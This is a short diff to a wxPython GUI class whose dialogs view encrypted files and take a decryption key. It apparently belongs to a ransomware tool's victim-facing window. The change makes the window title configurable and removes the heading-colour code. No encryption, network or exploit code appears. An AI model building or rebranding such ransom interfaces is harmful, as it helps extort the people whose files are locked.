@@ -406,18 +406,27 @@ class Gui( MainFrame, ViewEncryptedFilesDialog, EnterDecryptionKeyDialog, Base.B
 		)
 		
 		# Titles
-		self.SetTitle(self.GUI_LABEL_TEXT_TITLE[self.LANG] + " v%s.%s" % (
+		#=======================================================================
+		# self.SetTitle(self.GUI_LABEL_TEXT_TITLE[self.LANG] + " v%s.%s" % (
+		# 	self.__config["maj_version"],
+		# 	self.__config["min_version"]
+		# 	)
+		# )
+		# self.TitleLabel.SetLabel(self.GUI_LABEL_TEXT_TITLE[self.LANG].upper())
+		# self.TitleLabel.SetForegroundColour(wx.Colour(
+		# 	self.__config["heading_font_colour"][0],
+		# 	self.__config["heading_font_colour"][1],
+		# 	self.__config["heading_font_colour"][2],
+		# 	)
+		# )
+		#=======================================================================
+		self.SetTitle(self.__config["gui_title"] + " v%s.%s" % (
 			self.__config["maj_version"],
 			self.__config["min_version"]
 			)
 		)
-		self.TitleLabel.SetLabel(self.GUI_LABEL_TEXT_TITLE[self.LANG].upper())
-		self.TitleLabel.SetForegroundColour(wx.Colour(
-			self.__config["heading_font_colour"][0],
-			self.__config["heading_font_colour"][1],
-			self.__config["heading_font_colour"][2],
-			)
-		)
+		self.TitleLabel.SetLabel(self.__config["gui_title"])
+		
 		
 		# Set flashing text initial label and Colour
 		self.FlashingMessageText.SetLabel(self.GUI_LABEL_TEXT_FLASHING_ENCRYPTED[self.LANG])
